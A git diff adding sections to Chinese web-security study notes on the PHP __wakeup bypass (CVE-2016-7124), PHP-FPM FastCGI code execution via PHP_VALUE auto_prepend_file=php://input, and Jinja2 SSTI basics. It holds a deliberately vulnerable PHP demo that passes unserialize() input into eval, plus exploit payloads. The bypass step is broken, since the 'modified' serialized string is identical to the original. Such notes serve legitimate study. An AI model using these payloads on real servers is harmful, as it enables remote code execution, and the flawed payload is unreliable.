@@ -491,6 +491,64 @@ $str = new f4ke();
 
 ![image-20230802030952533](daydayup.assets/image-20230802030952533.png)
 
+###  CVE-2016-7124
+
+这是一个 PHP 的 CVE，影响版本：
+
+1. PHP5 < 5.6.25
+2. PHP7 < 7.0.10
+
+当序列化字符串中表示对象中属性个数的数字，大于真正的属性个数时，就会跳过 `__wakeup` 函数的执行（会触发两个长度相关的 `Notice: Unexpected end of serialized data`）。
+
+demo.php
+
+```php
+<?php
+highlight_file(__FILE__);
+class A {
+    public $test;
+
+    function __wakeup() {
+        $this->test = new B;
+    }
+
+    function __destruct() {
+        $this->test->check();
+    }
+}
+
+class B {
+    function check() {
+        echo phpversion()."\n";
+    }
+}
+
+class C {
+    public $boom;
+    function check() {
+        eval($this->boom);
+    }
+}
+
+if (isset($_GET['payload'])){
+    $user = unserialize($_GET['payload']);
+}else{
+    $user = new A();
+    $user->test = new B();
+}
+```
+
+```
+O:1:"A":1:{s:4:"test";O:1:"C":1:{s:4:"boom";s:10:"phpinfo();";}}
+修改为
+O:1:"A":1:{s:4:"test";O:1:"C":1:{s:4:"boom";s:10:"phpinfo();";}}
+即可执行payload
+```
+
+![image-20230802172523687](daydayup.assets/image-20230802172523687.png)
+
+![image-20230802172704900](daydayup.assets/image-20230802172704900.png)
+
 ## 无参数读文件
 
 ### 查看当前目录文件名
@@ -1689,7 +1747,46 @@ FPM按照fastcgi的协议将TCP流解析成真正的数据。
 
 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。
 
-##### EXP
+#### 任意代码执行
+
+那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？
+
+理论上当然是不可以的，即使我们能控制`SCRIPT_FILENAME`，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。
+
+但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，`auto_prepend_file`和`auto_append_file`。
+
+`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。
+
+那么就有趣了，假设我们设置`auto_prepend_file`为`php://input`，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项`allow_url_include`）
+
+那么，我们怎么设置`auto_prepend_file`的值？
+
+这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）
+
+```
+{
+    'GATEWAY_INTERFACE': 'FastCGI/1.0',
+    'REQUEST_METHOD': 'GET',
+    'SCRIPT_FILENAME': '/var/www/html/index.php',
+    'SCRIPT_NAME': '/index.php',
+    'QUERY_STRING': '?a=1&b=2',
+    'REQUEST_URI': '/index.php?a=1&b=2',
+    'DOCUMENT_ROOT': '/var/www/html',
+    'SERVER_SOFTWARE': 'php/fcgiclient',
+    'REMOTE_ADDR': '127.0.0.1',
+    'REMOTE_PORT': '12345',
+    'SERVER_ADDR': '127.0.0.1',
+    'SERVER_PORT': '80',
+    'SERVER_NAME': "localhost",
+    'SERVER_PROTOCOL': 'HTTP/1.1'
+    'PHP_VALUE': 'auto_prepend_file = php://input',
+    'PHP_ADMIN_VALUE': 'allow_url_include = On'
+}
+```
+
+设置`auto_prepend_file = php://input`且`allow_url_include = On`，然后将我们需要执行的代码放在Body中，即可执行任意代码。
+
+#### EXP
 
 ```python
 import socket
@@ -3010,19 +3107,89 @@ Python-Flask使用Jinja2作为渲染引擎 （Jinja2.10.x Documention）
 在jinja2中，存在三种语法：
 
 ```
-{% ... %} 用来声明变量
-{{ ... }} 用来将表达式打印到模板输出
+控制结构 {% %}，也可以用来声明变量（{% set c = "1" %}）
+变量取值 {{ }}，比如输入 1+1，2*2，或者是字符串、调用对象的方法，都会渲染出执行的结果
 {# ... #} 表示未包含在模板输出中的注释
 在模板注入中，主要使用的是{{}} 和 {%%}
 检测是否存在ssti
 在url后面，或是参数中添加 {{ 6*6 }} ，查看返回的页面中是否有 36
 ```
 
-jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这 些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等 
+jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等，被两个括号包裹的内容会输出其表达式的值。
 
-jinja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。
+###### 过滤器
 
-被两个括号包裹的内容会输出其表达式的值
+jinja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数，用于修饰变量，甚至支持参数 `range(10)|join(', ')`；以及链式调用，只需要在变量后面使用管道符 `|` 分割，前一个过滤器的输出会作为后一个过滤器的输入，例如，`{{ name|striptags|title }}` 会移除 HTML Tags，并且进行 title-case 转化，这个过滤器翻译为 Python 的语法就是 `title(striptags(name))`。
+
+###### 宏
+
+jinja2中还有宏，宏允许你定义一组代码，并在模板中多次调用它，类似于函数。
+
+使用 `macro` 关键字，并指定宏的名称和参数列表。然后，在模板中使用 `call` 关键字来调用宏，并传递相应的参数。
+
+```jinja2
+{% macro greet(name) %}
+    Hello, {{ name }}!
+{% endmacro %}
+
+{% call greet("A") %}
+{% call greet("B") %}
+```
+
+还能够设置默认参数
+
+```jinja2
+{% macro greet(name, greeting="Hello") %}
+    {{ greeting }}, {{ name }}!
+{% endmacro %}
+
+{% call greet("A") %}
+{% call greet("B", greeting="Hi") %}
+```
+
+###### 模板继承
+
+模板继承允许我们创建一个骨架文件，其他文件从该骨架文件继承。并且还支持针对自己需要的地方进行修改。
+
+jinja2 的骨架文件中，利用 `block` 关键字表示其包涵的内容可以进行修改。
+
+base.html
+
+```html
+<head>
+    {% block head %}
+    <title>{% block title %}{% endblock %} - Home</title>
+    {% endblock %}
+</head>
+
+<body>
+    <div id="content">{% block content %}{% endblock %}</div>
+    <div id="footer">
+        {% block  footer %}
+        <script>This is javascript</script>
+        {% endblock %}
+    </div>
+</body>
+```
+
+sub.html继承base.html的模板：
+
+```html
+{% extends "base.html" %}  <!-- 继承 -->
+
+{% block title %} Hello {% endblock %}  <!-- title 自定义 -->
+
+{% block head %}
+    {{ super() }}  <!-- 用于获取原有的信息 -->
+    <style type='text/css'>
+    .important { color: #FFFFFF }
+    </style>
+{% endblock %}   
+ 
+<!-- 其他不修改的原封不动的继承 -->
+```
+
+
 
 ##### Python中的一些 Magic Method
 
